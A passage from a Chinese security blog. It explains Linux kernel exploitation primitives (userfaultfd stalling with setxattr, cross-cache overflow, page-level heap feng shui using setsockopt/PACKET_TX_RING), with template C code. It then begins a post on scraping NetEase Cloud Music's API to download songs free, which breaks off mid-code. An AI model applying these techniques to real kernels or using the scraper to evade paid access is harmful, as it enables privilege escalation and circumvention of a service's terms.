<ul>
<li>我们通过 mmap 分配连续的两个页面：<ul>
<li>在第二个页面上启用 userfaultfd 监视</li>
<li>在第一个页面的末尾写入我们想要的数据</li>
</ul>
</li>
<li>此时我们调用 setxattr 进行跨页面的拷贝，当 <code>copy_from_user</code> 拷贝到第二个页面时便会触发 userfaultfd</li>
<li>从而让 setxattr 的执行流程卡在此处，这样这个 object 就不会被释放掉，而是可以继续参与我们接下来的利用</li>
</ul>
<p>堆占位一般用于 UAF 漏洞，当内核产生 UAF 堆块时，可以用堆占位技术将一个 object 放入其中，之后通过 UAF 漏洞就可以操控这个 object</p>
<p>注册 userfaultfd 的模板如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">long</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); <span class="comment">/* 生成一个userfaultfd */</span></span><br><span class="line"></span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="comment">/* 用户空间将在UFFD上使用READ/POLLIN协议 */</span></span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr;</span><br><span class="line">    ur.range.len = len;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="comment">/* 调用UFFDIO_REGISTER ioctl完成注册 */</span></span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);  </span><br><span class="line">    &#125;</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd); <span class="comment">/* 启动一个用以进行轮询的线程uffd monitor,该线程会通过poll函数(Linux中的字符设备驱动中的一个函数)不断轮询直到出现缺页异常 */</span></span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>处理函数 handler 的模板如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    </span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>); <span class="comment">/* 调用poll函数轮询直到出现缺页异常 */</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)); <span class="comment">/* 通过userfaultfd读取缺页信息 */</span></span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] msg error!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *page = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">        errExit(<span class="string">&quot;[-] mmap page error!!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ...... (核心功能)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);;</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="cross-cache-overflow-setsockopt"><a href="#cross-cache-overflow-setsockopt" class="headerlink" title="cross-cache overflow + setsockopt"></a>cross-cache overflow + setsockopt</h2><p><strong>Cross-Cache Overflow</strong></p>
<p>Cross-Cache Overflow 本质上是针对 buddy system 完成对 slub 攻击的利用手法</p>
<p>伙伴系统 buddy system 的机制如下：</p>
<ul>
<li>把系统中要管理的物理内存按照页面个数分为了11个组，分别对应11种大小不同的连续内存块，每组中的内存块大小都相等，且必须是2的n次幂 (Pow(2, n))，即 1, 2, 4, 8, 16, 32, 64, 128 … 1024</li>
<li>那么系统中就存在 2^0~2^10 这么11种大小不同的内存块，对应内存块大小为 4KB ~ 4M，内核用11个链表来管理11种大小不同的内存块（这11个双向链表都存储在 free_area 中）</li>
<li>在操作内存时，经常将这些内存块分成大小相等的两个块，分成的两个内存块被称为伙伴块，采用 “一位二进制数” 来表示它们的伙伴关系（这个 “一位二进制数” 存储在位图 bitmap 中）</li>
<li>系统根据该位为 “0” 或位为 “1” 来决定是否使用或者分配该页面块，系统每次分配和回收伙伴块时都要对它们的伙伴位跟 “1” 进行异或运算</li>
</ul>
<p>Cross-Cache Overflow 就是为了实现跨 kmem_cache 溢出的利用手法：</p>
<ul>
<li>slub 底层逻辑是向 buddy system 请求页面后再划分成特定大小 object 返还给上层调用者</li>
<li>但内存中用作不同 <code>kmem_cache</code> 的页面在内存上是有可能相邻的</li>
<li>若我们的漏洞对象存在于页面 A，溢出目标对象存在于页面 B，且 A,B 两页面相邻，则我们便有可能实现跨越不同 <code>kmem_cache</code> 之间的堆溢出</li>
</ul>
<p>Cross-Cache Overflow 需要两个 page 相邻排版，此时又需要使用另一个技术：页级堆风水</p>
<p><strong>页级堆风水</strong></p>
<p>页级堆风水即以内存页为粒度的内存排布方式，而内核内存页的排布对我们来说不仅未知且信息量巨大，因此这种利用手法实际上是让我们手工构造一个新的已知的页级粒度内存页排布</p>
<p>伙伴系统采用一个双向链表数组 free_area 来管理各个空闲块，在分配 page 时有如下的逻辑：</p>
<ul>
<li>free_area 的每个条目都是一个用于管理 2^n 大小空闲块的双向链表，每个 free_area[x] 都有一个 map 位图（用于表示各个伙伴块的关系）</li>
</ul>
<img src="/2022/05/21/kernel%20attack/1653447102092.png" class width="1653447102092"> 
<ul>
<li>当一个 m page 大小的空间将要被申请时，伙伴系统会首先在 free_area[n] 中查找（刚好满足条件的最小 n）</li>
<li>如果 free_area[n] 中有合适的内存块就直接分配出去，如果没有就继续在 free_area[n+1] 中查找</li>
<li>如果 free_area[n+1] 中有合适的内存块，就会将其均分为两份：<ul>
<li>其中一份分配出去</li>
<li>另一个插入 free_area[n] 中</li>
</ul>
</li>
<li>如果 free_area[n+1] 中也没有合适的内存块，则重复上面的过程，如果到达 free_area 数组的末端则放弃分配</li>
<li>如果在 bitmap 中检测到有两个伙伴块都处于空闲状态，则会进行合并，然后插入上级链表</li>
</ul>
<p>通过伙伴系统的分配流程我们可以发现：互为伙伴块的两片内存块一定是连续的</p>
<p>从更高阶 order 拆分成的两份低阶 order 的连续内存页是物理连续的，由此我们可以：</p>
<ul>
<li>向 buddy system 请求两份连续的内存页</li>
<li>释放其中一份内存页，在 <code>vulnerable kmem_cache</code> 上堆喷，让其取走这份内存页</li>
<li>释放另一份内存页，在 <code>victim kmem_cache</code> 上堆喷，让其取走这份内存页</li>
</ul>
<p>这样就可以保证 <code>vulnerable kmem_cache</code> 和 <code>victim kmem_cache</code> 就一定是连续的</p>
<p>如果想要完成上述操作，就需要使用 setsockopt 与 pgv 完成页级内存占位与堆风水</p>
<p><strong>setsockopt + pgv</strong></p>
<p>函数 <code>setsockopt</code> 用于任意类型，任意状态套接口的设置选项值，其函数原型如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setsockopt</span><span class="params">( <span class="keyword">int</span> socket, <span class="keyword">int</span> level, <span class="keyword">int</span> option_name,<span class="keyword">const</span> <span class="keyword">void</span> *option_value, <span class="keyword">size_t</span> ption_len)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>socket：套接字</li>
<li>level：被设置的选项的级别（如果想要在套接字级别上设置选项，就必须把 level 设置为 SOL_SOCKET）</li>
<li>option_name：指定准备设置的“选项” </li>
<li>option_value：指向存放选项值的缓冲区（用于设置所选“选项”的值）</li>
<li>ption_len：缓冲区的长度 </li>
<li>返回值：若无错误发生返回 “0”，否则返回 SOCKET_ERROR 错误（应用程序可通过 <code>WSAGetLastError()</code> 获取相应错误代码）</li>
</ul>
<p>利用步骤如下：</p>
<ul>
<li>创建一个 protocol 为 <code>PF_PACKET</code> 的 socket</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br></pre></td></tr></table></figure>
<ul>
<li>先调用 <code>setsockopt</code> 将 <code>PACKET_VERSION</code> 设为 <code>TPACKET_V1</code> / <code>TPACKET_V2</code>（）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="keyword">sizeof</span>(version));</span><br></pre></td></tr></table></figure>
<ul>
<li>再调用 <code>setsockopt</code> 提交一个 <code>PACKET_TX_RING</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">req.tp_block_size = size;</span><br><span class="line">req.tp_block_nr = nr;</span><br><span class="line">req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br></pre></td></tr></table></figure>
<p>此时便存在如下调用链： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__sys_setsockopt()</span><br><span class="line">    sock-&gt;ops-&gt;setsockopt()</span><br><span class="line">        packet_setsockopt() <span class="comment">// case PACKET_TX_RING ↓</span></span><br><span class="line">            packet_set_ring()</span><br><span class="line">                alloc_pg_vec()</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>alloc_pg_vec</code> 中会创建一个 <code>pgv</code> 结构体，用以分配 <code>tp_block_nr</code> 份 2^order 大小的内存页，其中 <code>order</code> 由 <code>tp_block_size</code> 决定</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct pgv *<span class="title">alloc_pg_vec</span><span class="params">(struct tpacket_req *req, <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(struct pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">			<span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">	free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">	pg_vec = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>alloc_one_pg_vec_page</code> 中会直接调用 <code>__get_free_pages</code> 向 buddy system 请求内存页，因此我们可以利用该函数进行大量的页面请求</li>
</ul>
<p>当我们耗尽 buddy system 中的 low order page 后，我们再请求的页面便都是物理连续的，因此此时我们再进行 <code>setsockopt</code> 便相当于获取到了一块近乎物理连续的内存：</p>
<ul>
<li>不能分配 low order page 时，程序就会从上一级的 free_area 中分配一个内存块</li>
<li>然后等分为两个 low order page，这两个 low order page 就是物理连续的</li>
<li>在 <code>setsockopt</code> 的流程中同样会分配大量我们不需要的结构体，从而消耗 buddy system 的部分页面，产生“噪声”</li>
</ul>
<p>具体的操作就是利用 <code>setsockopt</code> 申请大量的 1 page 内存块，部分 <code>setsockopt</code> 用于耗尽 low order page，而剩下的就有几率成为连续内存</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/" class="post-title-link" itemprop="url">不务正业系列：白嫖网易云（偶尔更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-05-19 11:57:59 / Modified: 22:31:34" itemprop="dateCreated datePublished" datetime="2022-05-19T11:57:59+08:00">2022-05-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/NoMaoWork/" itemprop="url" rel="index"><span itemprop="name">NoMaoWork</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>22k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>20 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="项目分析"><a href="#项目分析" class="headerlink" title="项目分析"></a>项目分析</h2><p>首先，感谢这位大佬的博客：（狗头保命）</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zgbzbl/article/details/107773755">『Python』网易云音乐API爬虫 Am0xil的博客-CSDN博客 网易云音乐搜索接口</a> </p>
<p>网易云官方 API 接口地址：<a target="_blank" rel="noopener" href="https://music.163.com">https://music.163.com</a></p>
<p>大佬使用的 API：<a target="_blank" rel="noopener" href="https://music.163.com/weapi/cloudsearch/get/web?csrf_token=">https://music.163.com/weapi/cloudsearch/get/web?csrf_token=</a></p>
<ul>
<li>这个 API 是大佬用 F12 找的</li>
<li>我也找了找，没有找到</li>
</ul>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652889291490-1652970678978.png" class width="1652889291490"> 
<ul>
<li>当时找到了“web?csrf_token”，但是没有发现歌曲的下载链接</li>
</ul>
<p>这里我先简述一下服务器请求机制：（之前在CSapp中学到过，也当是复习了吧）</p>
<p><strong>服务器请求</strong></p>
<p>一般的请求消息如下代码所示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /home.html HTTP/1.0 <span class="comment">&lt;!-- 请求消息行 --&gt;</span></span><br><span class="line">Accept: */* <span class="comment">&lt;!-- 请求消息头 --&gt;</span></span><br><span class="line">Host: localhost:GET /home.html HTTP/1.0</span><br><span class="line">Accept: */*</span><br><span class="line">Host: localhost:GET /home.html HTTP/1.0</span><br><span class="line">Accept: */*</span><br><span class="line">Host: localhost:</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3</span><br><span class="line">Connection: close</span><br><span class="line">Proxy-Connection: close</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="comment">&lt;!-- 消息正文 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">align</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">src</span>=<span class="string">&quot;godzilla.gif&quot;</span>&gt;</span></span><br><span class="line">Dave O&#x27;Hallaron</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>请求消息行：请求消息的第一行为请求消息行</p>
<ul>
<li>例如：GET  /test/test.html  HTTP/1.1</li>
<li>GET 为请求方式，请求方式分为：Get（默认）、POST、DELETE、HEAD等<ul>
<li>GET：明文传输 不安全，数据量有限，不超过1kb</li>
<li>POST：暗文传输，安全，数据量没有限制</li>
</ul>
</li>
<li>/test/test.html 为URI，统一资源标识符</li>
<li>HTTP/1.1 为协议版本</li>
</ul>
</li>
<li><p>请求消息头：从第二行开始到空白行统称为请求消息头（包含各种信息）</p>
</li>
<li><p>消息正文：当请求方式是[POST]方式时，才能看见消息正文，消息正文就是要传输的一些数据，如果没有数据需要传输时，消息正文为空</p>
</li>
</ul>
<p><strong>服务器响应</strong></p>
<p>一般的响应如下代码所示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK <span class="comment">&lt;!-- 响应消息行 --&gt;</span></span><br><span class="line">Server: Tiny Web Server <span class="comment">&lt;!-- 响应消息头 --&gt;</span></span><br><span class="line">Content-length: 120</span><br><span class="line">Content-type: text/html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="comment">&lt;!-- 响应正文 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">align</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">src</span>=<span class="string">&quot;godzilla.gif&quot;</span>&gt;</span></span><br><span class="line">Dave O&#x27;Hallaron</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>响应消息行：第一行响应消息为响应消息行<ul>
<li>例如：HTTP/1.0 200 OK</li>
<li>HTTP/1.0 为协议版本</li>
<li>200 为响应状态码，常用的响应状态码有40余种，这里我们仅列出几种，详细请看：<ul>
<li>200：一切正常</li>
<li>302/307：临时重定向</li>
<li>304：未修改，客户端可以从缓存中读取数据，无需从服务器读取</li>
<li>404：服务器上不存在客户端所请求的资源</li>
<li>500：服务器内部错误</li>
</ul>
</li>
<li>OK 为状态码描述</li>
</ul>
</li>
<li>响应消息头：和请求消息头类似</li>
<li>响应正文：即网页的源代码（F12可查看）</li>
</ul>
<p>先看看大佬对请求的处理：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_music_list</span>(<span class="params">params, encSecKey</span>):</span></span><br><span class="line">    url = <span class="string">&quot;https://music.163.com/weapi/cloudsearch/get/web?csrf_token=&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;params=&#x27;</span> + parse.quote(params) + <span class="string">&#x27;&amp;encSecKey=&#x27;</span> + parse.quote(encSecKey)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;authority&#x27;</span>: <span class="string">&#x27;music.163.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;origin&#x27;</span>: <span class="string">&#x27;https://music.163.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://music.163.com/search/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过歌曲的id获取播放链接</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_reply</span>(<span class="params">params, encSecKey</span>):</span></span><br><span class="line">    url = <span class="string">&quot;https://music.163.com/weapi/song/enhance/player/url/v1?csrf_token=&quot;</span></span><br><span class="line">    payload = <span class="string">&#x27;params=&#x27;</span> + parse.quote(params) + <span class="string">&#x27;&amp;encSecKey=&#x27;</span> + parse.quote(encSecKey)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;authority&#x27;</span>: <span class="string">&#x27;music.163.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        